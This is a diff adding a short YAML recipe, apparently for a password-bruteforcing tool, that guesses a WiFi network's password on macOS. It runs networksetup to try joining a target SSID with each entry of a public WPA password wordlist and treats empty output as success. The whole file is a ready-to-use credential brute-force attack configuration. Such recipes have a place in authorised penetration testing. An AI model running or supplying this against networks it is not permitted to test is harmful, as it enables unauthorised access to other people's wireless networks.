@@ -1,0 +1,14 @@
+description: Uses the cmd plugin in order bruteforce a WiFi password using /usr/sbin/networksetup
+author: evilsocket
+plugin: cmd
+args:
+    # we only need the password for this
+    username: ""
+    # https://github.com/danielmiessler/SecLists/blob/master/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt
+    password: "{$recipe.path}/../probable-v2-wpa-top4800.txt"
+    # we only need/have one valid password
+    single-match: null
+    cmd-binary: /usr/sbin/networksetup
+    cmd-args: "\\-setairportnetwork en0 '{TARGET}' '{PASSWORD}'"
+    # empty string means success
+    cmd-success-match: ""
